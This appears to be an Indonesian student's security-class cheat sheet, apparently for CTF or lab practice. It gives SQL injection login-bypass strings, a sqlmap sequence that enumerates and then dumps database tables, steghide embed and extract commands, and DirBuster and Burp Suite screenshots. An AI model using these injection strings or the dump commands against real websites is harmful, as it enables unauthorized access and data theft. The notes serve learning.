Keamanan Informasi

# Paksa Masuk
admin' --

kata' or id_user = 1 --

# Burp Suite

<img width="415" alt="image" src="https://github.com/stinkmtul/test/assets/123925640/9a3c1574-b6ee-4ed6-aa09-057832e68361">

<img width="415" alt="image" src="https://github.com/stinkmtul/test/assets/123925640/bb4c402f-99a2-4633-a00f-4de0d8d67792">

<img width="415" alt="image" src="https://github.com/stinkmtul/test/assets/123925640/efdd79b0-0e2d-4199-88e2-f49e44d09828">

<img width="415" alt="image" src="https://github.com/stinkmtul/test/assets/123925640/d44809a5-ba10-4b7f-be47-a659ce18c6e1">

<img width="415" alt="image" src="https://github.com/stinkmtul/test/assets/123925640/eaf045c9-e517-4f01-a902-640a3163cb47">

<img width="415" alt="image" src="https://github.com/stinkmtul/test/assets/123925640/3aa31137-bcaf-4de6-91c5-31dff9b45756">

<img width="415" alt="image" src="https://github.com/stinkmtul/test/assets/123925640/89fcb393-c598-413b-a87b-ce9d04995e67">

<img width="415" alt="image" src="https://github.com/stinkmtul/test/assets/123925640/c90d5349-46ec-4386-b1d7-e2c6291e3991">

<img width="415" alt="image" src="https://github.com/stinkmtul/test/assets/123925640/74d8f2b1-03a8-4823-8869-903abe6e7a32">

<img width="415" alt="image" src="https://github.com/stinkmtul/test/assets/123925640/106be393-84e7-4fe5-81e9-3b774429bba4">

<img width="415" alt="image" src="https://github.com/stinkmtul/test/assets/123925640/a1067612-5093-49f7-8324-e75ea95719d6">

<img width="415" alt="image" src="https://github.com/stinkmtul/test/assets/123925640/eb4455ad-239a-4bfe-a3c2-2b0e43a14cd3">


# Steghide (Windows)

<img width="415" alt="image" src="https://github.com/stinkmtul/test/assets/123925640/e3bf6e2d-e74e-4c41-acdf-5b05c301498c">

ni buat naro isi file ke gambar

steghide embed -cf Galaksi.jpg -ef flag1.txt

ini buat extract
steghide extract -sf Galaksi.jpg


# Dirbuster - Windows

<img width="415" alt="image" src="https://github.com/stinkmtul/test/assets/123925640/9fd9e08c-da31-4730-ad73-9e1b30ab22b5">

<img width="415" alt="image" src="https://github.com/stinkmtul/test/assets/123925640/b2625c8d-9b59-4da4-990e-6526a561ec56">


# SQLMAP - Kali Linux

**Database :**

![image](https://github.com/stinkmtul/test/assets/123925640/9f23d015-0e65-4ff0-9e82-5d6fb7d3de9d)


sqlmap -u linkwebsite --dbs, maka akan muncul database yang digunakan dari website tersebut


**Kolom :**

![image](https://github.com/stinkmtul/test/assets/123925640/46f13576-f159-446b-af88-655645729bca)

![image](https://github.com/stinkmtul/test/assets/123925640/81dbcdcd-4866-462c-83d4-a422f0fd16ec)


sqlmap -u linkwebsite -D namadatabase -columns 


**Tabel :**

![image](https://github.com/stinkmtul/test/assets/123925640/a9b0af87-ef23-4a64-81b2-d0260d7ccedc)

![image](https://github.com/stinkmtul/test/assets/123925640/5f334835-2bd4-41b4-b0ff-372025cf1301)


sqlmap -u linkwebsite -D namadatabase -columns -T namatabel


**Dumpdata :**

![image](https://github.com/stinkmtul/test/assets/123925640/5b71b523-a02b-4fb5-a58d-1d7f20a84de4)


![image](https://github.com/stinkmtul/test/assets/123925640/f3c07f92-e99a-4a1c-80be-cd0ce87b21a1)

sqlmap -u linkwebsite -D namadatabase -columns -T namatabel -C namakolom --dump, ini akan memunculkan isi dari tabel

# Website decrpyt
https://dencode.com/en/
https://md5decrypt.net/en/
